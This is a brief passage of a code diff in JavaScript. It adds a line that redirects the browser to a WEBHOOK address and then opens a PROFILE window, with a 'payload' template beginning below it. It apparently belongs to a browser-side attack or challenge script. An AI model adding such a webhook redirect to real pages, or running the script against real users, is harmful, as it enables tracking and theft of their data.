@@ -25,6 +25,7 @@ function imgEnd() {
 // const id = urlParams.get("id");
 
 try {
+  window.location = WEBHOOK;
   window.open(PROFILE, OPEN);
 
   const payload = `
